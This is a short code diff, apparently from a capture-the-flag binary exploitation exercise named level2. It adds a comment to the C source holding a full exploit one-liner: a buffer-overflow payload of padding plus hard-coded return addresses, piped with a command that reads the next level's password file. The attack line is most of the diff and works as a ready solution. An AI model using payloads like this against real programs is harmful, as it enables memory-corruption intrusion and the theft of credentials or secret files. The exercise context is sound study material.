@@ -20,6 +20,7 @@ void p(void)
     strdup(buf);
 }
 
+// (python -c "print 'A'*80 + '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7'"; echo "cat /home/user/level3/.pass") | ./level2
 int main(void)
 {
     p();
